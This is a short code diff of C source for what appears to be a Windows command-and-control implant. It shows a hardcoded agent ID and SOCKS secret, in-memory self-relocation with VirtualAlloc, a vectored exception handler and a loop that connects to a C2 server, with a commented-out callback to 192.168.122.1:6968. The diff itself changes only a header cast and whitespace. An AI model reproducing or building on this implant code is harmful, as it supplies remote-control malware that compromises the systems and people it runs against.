@@ -8,7 +8,6 @@ int main(int argc, char** argv);
 #include "commands.h"
 #include "c2.h"
 #include "crypter.h"
-
 #define UUID "peasant2"
 #define SOCKS_SECRET "VERYSECRET1337"
 const char* dlls[] = {"advapi32.dll", "gdi32.dll", "kernel32.dll", "msvcrt.dll", "ole32.dll", "shlwapi.dll", "user32.dll", "wininet.dll", "ws2_32.dll"};
@@ -19,7 +18,7 @@ int main(int argc, char** argv){
             imageBase = GetModuleHandleA(NULL);
         deltaIB = (unsigned long long)&imageBase - (unsigned long long)imageBase;
 	    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
-	    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
+	    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
 	    dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
         
 	    revival = VirtualAlloc(NULL, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
@@ -32,6 +31,7 @@ int main(int argc, char** argv){
             AddVectoredExceptionHandler(1, hand);
         }
     }
+    
     C2* conn;
     while(1){
         //conn = newC2(SOCKS, UUID, SOCKS_SECRET, "192.168.122.1", 6968, 1000);
